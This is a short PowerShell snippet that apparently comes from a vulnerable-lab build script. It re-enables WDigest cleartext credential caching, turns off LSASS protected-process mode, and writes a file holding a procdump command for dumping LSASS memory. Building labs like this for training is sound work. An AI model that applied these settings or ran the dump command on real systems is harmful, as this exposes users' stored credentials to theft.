# vuln: lsass_credential_dump | severity: critical
Write-Host "[VULN] Enabling LSASS credential dumping..."
reg add "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" /v UseLogonCredential /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\LSASS.exe" /v AuditLevel /t REG_DWORD /d 8 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v RunAsPPL /t REG_DWORD /d 0 /f
New-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" -Name "UseLogonCredential" -Value 1 -PropertyType DWORD -Force | Out-Null
Set-Content -Path "C:\Temp\dump_instructions.txt" -Value "Attack: procdump.exe -accepteula -ma lsass.exe lsass.dmp`nOr: Task Manager -> lsass.exe -> Create Dump File"
Write-Host "[VULN] LSASS protection disabled — credentials extractable via dump."
